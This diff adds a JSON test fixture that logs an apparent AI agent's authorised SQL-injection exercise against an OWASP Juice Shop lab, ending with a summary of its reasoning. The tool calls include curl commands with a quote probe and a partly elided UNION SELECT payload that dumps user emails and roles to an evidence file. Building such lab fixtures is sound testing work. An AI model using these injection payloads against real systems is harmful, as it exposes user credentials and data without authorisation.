@@ -1,0 +1,40 @@
+[
+  {
+    "type": "session_start",
+    "data": {
+      "engagement_name": "story-fixture",
+      "targets": "http://host.docker.internal:3000 (test lab)",
+      "allowed_hosts": ["host.docker.internal", "localhost", "127.0.0.1"],
+      "goal": "Use UNION SQL injection to dump the users table to evidence/story_users.txt",
+      "evidence": {"type": "file_exists", "path": "evidence/story_users.txt", "contains": "admin@example.com"},
+      "max_steps": 30,
+      "max_cost_usd": 0.25,
+      "workspace": "workspace"
+    },
+    "ts": "2026-10-19T03:49:22.946384"
+  },
+  {"type": "cost_update", "data": {"total_usd": 0.0003, "tokens_in": 1650, "tokens_out": 102}, "ts": "2026-10-19T03:49:24.100000"},
+  {
+    "type": "tool_call",
+    "data": {"tool": "run_command", "args": {"command": "curl -s -i http://host.docker.internal:3000/ | head -20"}},
+    "ts": "2026-10-19T03:49:24.200000"
+  },
+  {"type": "cost_update", "data": {"total_usd": 0.0008, "tokens_in": 2177, "tokens_out": 267}, "ts": "2026-10-19T03:49:27.000000"},
+  {
+    "type": "tool_call",
+    "data": {"tool": "run_command", "args": {"command": "curl -s -G --data-urlencode \"q=apple')--\" http://host.docker.internal:3000/rest/products/search"}},
+    "ts": "2026-10-19T03:49:29.000000"
+  },
+  {"type": "cost_update", "data": {"total_usd": 0.0017, "tokens_in": 3187, "tokens_out": 361}, "ts": "2026-10-19T03:49:31.000000"},
+  {
+    "type": "tool_call",
+    "data": {"tool": "run_command", "args": {"command": "curl -s -G --data-urlencode \"q=apple')) UNION SELECT email,role,NULL... -- \" http://host.docker.internal:3000/rest/products/search > /workspace/evidence/story_users.txt"}},
+    "ts": "2026-10-19T03:49:40.000000"
+  },
+  {"type": "cost_update", "data": {"total_usd": 0.0274, "tokens_in": 31645, "tokens_out": 121}, "ts": "2026-10-19T03:49:50.000000"},
+  {
+    "type": "session_end",
+    "data": {"summary": "## Reasoning path\n1. Recon: confirmed OWASP Juice Shop on :3000.\n2. Found the product search endpoint reflected a SQL error on a single quote.\n3. Determined the column count and used a UNION SELECT to read email+role from Users.\n4. Saved the first 10 rows to evidence/story_users.txt (includes admin@example.com)."},
+    "ts": "2026-10-19T03:49:50.500000"
+  }
+]
